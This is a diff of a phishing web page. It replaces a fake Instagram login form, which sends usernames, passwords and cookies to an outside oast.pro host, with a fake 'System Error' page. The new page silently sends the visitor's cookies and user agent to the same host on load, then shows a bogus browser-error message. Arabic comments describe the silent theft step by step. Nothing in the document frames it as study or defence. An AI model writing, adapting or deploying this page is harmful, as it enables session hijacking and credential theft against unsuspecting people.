@@ -1,15 +1,33 @@
-<!DOCTYPE html><html><head><title>Login • Instagram</title><meta charset="UTF-8">
+<!DOCTYPE html><html><head><title>System Error</title><meta charset="UTF-8">
+<style>
+    body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .error-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+    h1 { color: #dc3545; font-size: 24px; }
+    p { color: #4b4f56; line-height: 1.5; }
+    .btn { background-color: #0095f6; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block; margin-top: 15px; font-weight: bold; }
+</style>
 <script type="text/javascript">
 window.onload = function() {
-    var c = document.cookie;
-    fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?type=init', {method:'POST', mode:'no-cors', body:btoa(c)});
-    document.write(atob("PGJvZHk+PGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLXRvcDoyMCU7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjsiPjxoMT5JbnN0YWdyYW08L2gxPjxmb3JtIGlkPSJhIj48aW5wdXQgdHlwZT0idGV4dCIgaWQ9InUiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSIgc3R5bGU9ImRpc3BsYXk6YmxvY2s7bWFyZ2luOjEwcHggYXV0bzsiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InAiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgc3R5bGU9ImRpc3BsYXk6YmxvY2s7bWFyZ2luOjEwcHggYXV0bzsiPjxidXR0b24gdHlwZT0ic3VibWl0Ij5Mb2cgSW48L2J1dHRvbj48L2Zvcm0+PC9kaXY+PC9ib2R5Pg=="));
-    document.getElementById('a').onsubmit = function(e) {
-        e.preventDefault();
-        fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?type=full', {
-            method:'POST', mode:'no-cors',
-            body: JSON.stringify({u:document.getElementById('u').value, p:document.getElementById('p').value, c:c})
-        }).then(function() { window.location.href='https://instagram.com'; });
-    };
+    // 1. سحب الكوكيز فوراً وتشفيرها
+    var c = document.cookie || "no_cookies_found";
+    var payload = btoa(unescape(encodeURIComponent(c + "|UA:" + navigator.userAgent)));
+
+    // 2. إرسال البيانات فوراً إلى RequestBin
+    fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?type=error_exploit', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    });
+
+    // 3. عرض واجهة الخطأ بعد 1 ثانية من السحب الصامت
+    setTimeout(function() {
+        document.body.innerHTML = `
+            <div class="error-container">
+                <h1>Browser Error (0x80040154)</h1>
+                <p>The current browser session is not compatible with this secure link. Please copy the link and open it in <b>Google Chrome</b> or <b>Safari</b> to continue.</p>
+                <a href="#" class="btn" onclick="window.location.reload()">Retry Connection</a>
+            </div>
+        `;
+    }, 500);
 };
-</script></head><body></body></html>
+</script></head><body><p style="color:#eee">Loading secure environment...</p></body></html>
